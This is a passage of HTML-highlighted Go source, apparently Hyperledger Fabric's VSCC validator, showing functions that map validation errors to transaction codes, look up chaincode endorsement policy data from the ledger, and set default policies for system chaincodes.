			&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCEndorsementPolicyError&lt;/span&gt;:
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_ENDORSEMENT_POLICY_FAILURE&lt;/span&gt;
			&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;:
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
			}
		}
	}
	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[%s] VSCCValidateTx completes env bytes %p&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chainID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_VALID&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCValidateTxForCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Context&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debug&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Validating&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;with plugin&amp;#34;&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pluginValidator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ValidateWithPlugin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
	}
	&lt;span style=&#34;color:#75715e&#34;&gt;// If the error is a pluggable validation execution error, cast it to the common errors ExecutionFailureError.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;isExecutionError&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;.(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;validation&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ExecutionFailureError&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;isExecutionError&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCExecutionFailureError&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Err&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;}
	}
	&lt;span style=&#34;color:#75715e&#34;&gt;// Else, treat it as an endorsement error.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCEndorsementPolicyError&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;Err&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;}
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;getCDataForCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeData&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Ledger&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nil ledger instance&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;qe&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewQueryExecutor&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;could not retrieve QueryExecutor&amp;#34;&lt;/span&gt;)
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;qe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;()

	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;qe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetState&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;commonerrors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCInfoLookupFailureError&lt;/span&gt;{
			&lt;span style=&#34;color:#a6e22e&#34;&gt;Reason&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not retrieve state for chaincode %s, error %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;),
		}
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#39;s state for [%s] not found.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeData&lt;/span&gt;{}
	&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Unmarshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Wrap&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unmarshalling ChaincodeQueryResponse failed&amp;#34;&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Vscc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#39;s state for [%s] is invalid, vscc field must be set&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Policy&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;lscc&amp;#39;s state for [%s] is invalid, policy field must be set&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccid&lt;/span&gt;)
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// GetInfoForValidate gets the ChaincodeInstance(with latest version) of tx, vscc and policy from lscc
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;GetInfoForValidate&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInstance&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInstance&lt;/span&gt;, []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInstance&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;,
	}
	&lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sysccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInstance&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelID&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vscc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// default vscc for system chaincodes
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;) {
		&lt;span style=&#34;color:#75715e&#34;&gt;// when we are validating a chaincode that is not a
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// system CC, we need to ask the CC to give us the name
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// of VSCC and of the policy that should be used
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
		&lt;span style=&#34;color:#75715e&#34;&gt;// obtain name of the VSCC and the policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCDataForCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Unable to get chaincode data from ledger for txid %s, due to %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxId&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
			&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeVersion&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;
		&lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Vscc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Policy&lt;/span&gt;
	} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
		&lt;span style=&#34;color:#75715e&#34;&gt;// when we are validating a system CC, we use the default
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// VSCC and a default policy that requires one signature
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// from any of the members of the channel
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;policydsl&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedByAnyMember&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetMSPIDs&lt;/span&gt;())
		&lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
		}
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// txWritesToNamespace returns true if the supplied NsRwSet
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// performs a ledger write
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;txWritesToNamespace&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ns&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rwsetutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NsRwSet&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; {
	&lt;span style=&#34;color:#75715e&#34;&gt;// check for public writes first
